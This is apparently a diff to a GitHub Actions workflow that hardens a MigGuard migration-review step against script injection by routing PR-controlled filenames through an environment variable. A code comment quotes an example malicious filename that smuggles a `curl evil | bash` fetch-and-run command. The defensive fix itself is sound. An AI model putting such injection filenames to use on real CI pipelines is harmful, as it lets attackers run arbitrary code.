@@ -50,9 +50,21 @@ jobs:
       - name: Run MigGuard review
         id: review
         if: steps.changed.outputs.files != ''
+        env:
+          # PR-author-controlled file paths reach the shell only via this env
+          # var, never via direct ${{ }} template substitution into the run
+          # block. This neutralises script-injection attempts through
+          # malicious filenames (e.g. `foo.sql; curl evil | bash; #.sql`).
+          # See https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
+          FILES: ${{ steps.changed.outputs.files }}
         run: |
           set +e
-          python -m migguard.cli.main review ${{ steps.changed.outputs.files }} \
+          # $FILES is intentionally unquoted: it is the space-separated list
+          # built in the previous step, and we want shell word-splitting to
+          # turn it back into argv. Word-splitting does NOT re-parse shell
+          # metacharacters, so a `;` inside one filename stays inside that
+          # one argv element.
+          python -m migguard.cli.main review $FILES \
             --format markdown --no-llm --strict \
             --output migguard-report.md
           rc=$?
